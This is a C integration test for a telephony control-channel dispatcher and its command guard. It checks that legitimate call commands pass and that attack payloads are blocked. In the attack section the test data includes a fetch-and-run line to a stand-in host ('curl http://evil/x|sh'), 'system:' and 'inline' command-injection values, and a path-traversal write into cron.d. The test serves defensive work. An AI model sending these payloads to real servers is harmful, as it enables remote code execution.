/* Integration test of the REAL control-channel dispatch path:
 *   command JSON -> es_proto_on_text -> es_dispatch_command -> es_cmdguard -> sink
 * Proves (1) legitimate commands still map to the exact uuid_* api+arg (nothing broke),
 * and (2) every attack payload is blocked. Prints each result for human inspection. */
#include "es_proto.h"
#include <stdio.h>
#include <string.h>
#include <assert.h>

static char g_api[64], g_arg[1024], g_action[64], g_reason[160];
static int  g_blocked;

static void cap(void *u, const char *action, const char *api, const char *arg, const char *id)
{
    (void) u; (void) id;
    snprintf(g_action, sizeof g_action, "%s", action ? action : "");
    if (!api) { g_blocked = 1; g_api[0] = 0; g_arg[0] = 0; snprintf(g_reason, sizeof g_reason, "%s", arg ? arg : "(unsupported)"); }
    else      { g_blocked = 0; snprintf(g_api, sizeof g_api, "%s", api); snprintf(g_arg, sizeof g_arg, "%s", arg ? arg : ""); g_reason[0] = 0; }
}
static void na(void *u, const int16_t *p, size_t n) { (void) u;(void) p;(void) n; }
static void nc(void *u) { (void) u; }
static void nm(void *u, const char *n) { (void) u;(void) n; }
static void nd(void *u, const char *d) { (void) u;(void) d; }
static void nt(void *u, const char *t, int f) { (void) u;(void) t;(void) f; }

static es_proto_sink_t SINK;
static es_proto_ctx_t *P;
static int fails;

static void run(const char *json) { g_blocked = -1; g_api[0] = g_arg[0] = g_reason[0] = 0; es_proto_on_text(P, json, strlen(json), &SINK); }

#define LEGIT(json, exp_api, exp_arg) do { run(json); \
    printf("  %-58s -> exec  api=%-14s arg=[%s]\n", g_action, g_api, g_arg); \
    if (g_blocked || strcmp(g_api, exp_api) || strcmp(g_arg, exp_arg)) { \
        printf("    !! FAIL expected api=%s arg=[%s]%s\n", exp_api, exp_arg, g_blocked ? " (was BLOCKED)" : ""); fails++; } } while (0)

#define BLOCK(json) do { run(json); \
    printf("  %-58s -> %s %s\n", g_action, g_blocked ? "BLOCK" : "**EXECUTED**", g_reason); \
    if (!g_blocked) { printf("    !! FAIL expected BLOCK, got api=%s arg=[%s]\n", g_api, g_arg); fails++; } } while (0)

/* Structural garbage (not JSON, not an object, or not a command message) must never reach the
 * command dispatcher: on_command must not fire, so g_blocked stays -1. cJSON-independent. */
#define IGNORED(json) do { run(json); \
    printf("  %-54.54s -> %s\n", json, g_blocked==-1?"ignored":g_blocked?"blocked":"**EXECUTED**"); \
    if (g_blocked != -1) { printf("    !! FAIL structural garbage reached the dispatcher (api=%s)\n", g_api); fails++; } } while (0)

/* Command-shaped but malformed values: the guarantee here is "no crash / no overflow" — proven
 * by reaching the next statement (run under ASan in CI). Whether such input is blocked or executes
 * a harmless/truncated call depends on the JSON lib's edge-case parsing; the *values'* safety is
 * asserted directly in test_cmdguard.c, so this pass only fuzzes the parse/dispatch plumbing. */
#define NOCRASH(json) do { run(json); \
    printf("  %-54.54s -> %s (no crash)\n", json, g_blocked==-1?"ignored":g_blocked?"blocked":"executed"); } while (0)

int main(void)
{
    SINK.user = 0; SINK.on_audio = na; SINK.on_clear = nc; SINK.on_mark = nm;
    SINK.on_dtmf = nd; SINK.on_command = cap; SINK.on_transcript = nt;
    P = es_proto_create(ES_PROTO_NATIVE, ES_CODEC_L16, 8000, 8000, "callid-1", "UUID-1", 0);
    assert(P);
    es_proto_set_setvar_allow(P, "agent_intent,customer_tier");

    printf("\n== LEGITIMATE commands (regression: must still produce the correct uuid_* call) ==\n");
    LEGIT("{\"type\":\"command\",\"action\":\"play\",\"file\":\"/var/media/hello.wav\"}",         "uuid_broadcast", "UUID-1 /var/media/hello.wav aleg");
    LEGIT("{\"type\":\"command\",\"action\":\"play\",\"file\":\"/var/media/x.wav\",\"leg\":\"both\"}", "uuid_broadcast", "UUID-1 /var/media/x.wav both");
    LEGIT("{\"type\":\"command\",\"action\":\"transfer\",\"to\":\"1000\"}",                         "uuid_transfer",  "UUID-1 1000");
    LEGIT("{\"type\":\"command\",\"action\":\"transfer\",\"to\":\"1000\",\"context\":\"default\"}", "uuid_transfer",  "UUID-1 1000 default");
    LEGIT("{\"type\":\"command\",\"action\":\"hangup\"}",                                           "uuid_kill",      "UUID-1 NORMAL_CLEARING");
    LEGIT("{\"type\":\"command\",\"action\":\"send_dtmf\",\"digits\":\"12*#\"}",                    "uuid_send_dtmf", "UUID-1 12*#");
    LEGIT("{\"type\":\"command\",\"action\":\"record\",\"file\":\"/var/rec/call.wav\"}",            "uuid_record",    "UUID-1 start /var/rec/call.wav");
    LEGIT("{\"type\":\"command\",\"action\":\"setvar\",\"name\":\"agent_intent\",\"value\":\"premium tier\"}", "uuid_setvar", "UUID-1 agent_intent premium tier");
    LEGIT("{\"type\":\"command\",\"action\":\"hold\"}",                                             "uuid_hold",      "UUID-1");
    LEGIT("{\"type\":\"command\",\"action\":\"park\"}",                                             "uuid_park",      "UUID-1");

    printf("\n== ATTACK payloads (must ALL be blocked) ==\n");
    BLOCK("{\"type\":\"command\",\"action\":\"play\",\"file\":\"system::curl http://evil/x|sh\"}"); /* app-exec RCE */
    BLOCK("{\"type\":\"command\",\"action\":\"play\",\"file\":\"lua::/tmp/evil.lua\"}");
    BLOCK("{\"type\":\"command\",\"action\":\"transfer\",\"to\":\"system:id inline\"}");            /* whitespace positional -> inline RCE */
    BLOCK("{\"type\":\"command\",\"action\":\"transfer\",\"to\":\"1000\",\"dialplan\":\"inline\"}");
    BLOCK("{\"type\":\"command\",\"action\":\"setvar\",\"name\":\"transfer_after_bridge\",\"value\":\"system:id inline\"}"); /* value->inline; not in allowlist */
    BLOCK("{\"type\":\"command\",\"action\":\"setvar\",\"name\":\"execute_on_answer\",\"value\":\"system id\"}");
    BLOCK("{\"type\":\"command\",\"action\":\"record\",\"file\":\"../../etc/cron.d/x\"}");          /* traversal */
    BLOCK("{\"type\":\"command\",\"action\":\"record\",\"file\":\"system::x\"}");
    BLOCK("{\"type\":\"command\",\"action\":\"bogus\"}");                                           /* unsupported */

    printf("\n== ALLOWLIST behaviour (setvars=agent_intent,customer_tier) ==\n");
    LEGIT("{\"type\":\"command\",\"action\":\"setvar\",\"name\":\"customer_tier\",\"value\":\"vip\"}", "uuid_setvar", "UUID-1 customer_tier vip");
    BLOCK("{\"type\":\"command\",\"action\":\"setvar\",\"name\":\"some_other_var\",\"value\":\"x\"}"); /* not listed -> fail closed */

    printf("\n== STRUCTURAL garbage (must be ignored — never reach the dispatcher) ==\n");
    IGNORED("");                                            /* empty */
    IGNORED("   ");                                         /* whitespace only */
    IGNORED("not json at all");
    IGNORED("{");                                           /* truncated object */
    IGNORED("{\"type\":");                                  /* truncated mid-key */
    IGNORED("[]"); IGNORED("[1,2,3]");                      /* array, not object */
    IGNORED("null"); IGNORED("123"); IGNORED("3.14"); IGNORED("true"); IGNORED("\"a string\""); /* scalars */
    IGNORED("{}");                                          /* no type */
    IGNORED("{\"type\":123}");                              /* type is not a string */
    IGNORED("{\"type\":\"audio\",\"data\":\"@@@notbase64@@@\"}"); /* a different message type */
    IGNORED("{\"type\":\"unknown_kind\"}");

    printf("\n== FUZZ: command-shaped but malformed (must not crash) ==\n");
    NOCRASH("{\"type\":\"command\"}");                      /* no action */
    NOCRASH("{\"type\":\"command\",\"action\":\"\"}");      /* empty action */
    NOCRASH("{\"type\":\"command\",\"action\":123}");       /* action not a string */
    NOCRASH("{\"type\":\"command\",\"action\":\"play\"}");  /* play, no file */
    NOCRASH("{\"type\":\"command\",\"action\":\"transfer\",\"to\":null}");  /* null field */
    NOCRASH("{\"type\":\"command\",\"action\":{\"nested\":\"obj\"}}");      /* action is an object */
    NOCRASH("{\"type\":\"command\",\"action\":\"play\",\"file\":\"a\tb\"}"); /* literal control char */

    /* oversized value: a ~8 KB file path must not overflow the fixed dispatch buffer (snprintf-bounded) */
    {
        static char big[9000];
        int k = snprintf(big, sizeof big, "{\"type\":\"command\",\"action\":\"play\",\"file\":\"");
        memset(big + k, 'A', 8000); k += 8000;
        memcpy(big + k, "\"}", 3);   /* incl. NUL */
        NOCRASH(big);
    }

    printf("\n%s (%d failure%s)\n", fails ? "!!! DISPATCH TEST FAILED" : "command-dispatch: all cases correct",
           fails, fails == 1 ? "" : "s");
    return fails ? 1 : 0;
}
